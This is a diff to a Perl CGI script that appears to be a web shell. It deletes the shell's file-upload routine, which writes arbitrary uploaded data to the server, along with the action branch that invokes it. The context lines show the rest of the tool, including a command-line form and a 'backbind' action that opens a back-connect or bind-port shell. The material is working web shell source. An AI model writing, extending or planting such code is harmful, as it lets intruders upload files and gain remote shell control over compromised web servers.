@@ -713,52 +713,6 @@ sub BeginDownload
 }
 
 #------------------------------------------------------------------------------
-# This function is called when the user wants to upload a file. If the
-# file is not specified, it displays a form allowing the user to specify a
-# file, otherwise it starts the upload process.
-#------------------------------------------------------------------------------
-sub UploadFile
-{
-	# if no file is specified, print the upload form again
-	if($TransferFile eq "")
-	{
-		return &PrintFileUploadForm;
-
-	}
-	my $result="";
-	# start the uploading process
-	$result .= "Uploading $TransferFile to $CurrentDir...<br>";
-
-	# get the fullly qualified pathname of the file to be created
-	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
-	$TransferFile =~ m!([^/^\\]*)$!;
-	$TargetName .= $PathSep.$1;
-
-	$TargetFileSize = length($in{'filedata'});
-	# if the file exists and we are not supposed to overwrite it
-	if(-e $TargetName && $Options ne "overwrite")
-	{
-		$result .= "Failed: Destination file already exists.<br>";
-	}
-	else # file is not present
-	{
-		if(open(UPLOADFILE, ">$TargetName"))
-		{
-			binmode(UPLOADFILE) if $WinNT;
-			print UPLOADFILE $in{'filedata'};
-			close(UPLOADFILE);
-			$result .= "Transfered $TargetFileSize Bytes.<br>";
-			$result .= "File Path: $TargetName<br>";
-		}
-		else
-		{
-			$result .= "Failed: $!<br>";
-		}
-	}
-	$result .= &PrintCommandLineInputForm;
-	return $result;
-}
-#------------------------------------------------------------------------------
 # This function is called when the user wants to download a file. If the
 # filename is not specified, it displays a form allowing the user to specify a
 # file, otherwise it displays a message to the user and provides a link
@@ -1598,10 +1552,6 @@ elsif($Action eq "save")				 	# user wants to save a file
 		print "<run> Sorry! You dont have permissions! </run><br>";
 	}
 	print &ListDir;
-}elsif($Action eq "upload") 					# user wants to upload a file
-{
-	&PrintPageHeader("c");
-	print &UploadFile;
 }elsif($Action eq "backbind") 				# user wants to back connect or bind port
 {
 	&PrintPageHeader("clientport");
